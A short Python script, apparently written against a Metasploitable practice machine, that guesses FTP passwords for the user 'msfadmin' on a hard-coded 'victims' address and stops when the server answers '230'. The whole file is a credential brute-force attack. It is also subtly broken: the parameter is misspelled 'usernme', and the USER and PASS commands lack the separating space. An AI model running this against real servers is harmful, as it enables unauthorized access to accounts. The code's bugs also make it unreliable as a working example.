#! /usr/bin/python

import socket
import re
import sys

def connect(usernme, password):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('[+] Trying '+username+" : "+password)
    s.connect(('192.168.1.107', 21)) #victims ip here
    data = s.recv(1024)
    s.send('USER'+username+'\r\n')
    data = s.recv(1024)
    s.send('PASS' + password+ '\r\n')
    data = s.recv(3)
    s.send('QUIT\r\n')
    s.close()
    return data

username = 'msfadmin'
passwords = ['test', 'backup', 'password']

for password in passwords:
    attempt = connect(username, password)
    if attempt == '230': #'230' data is given only if we get a success
        print('password is found '+password)
        sys.exit()
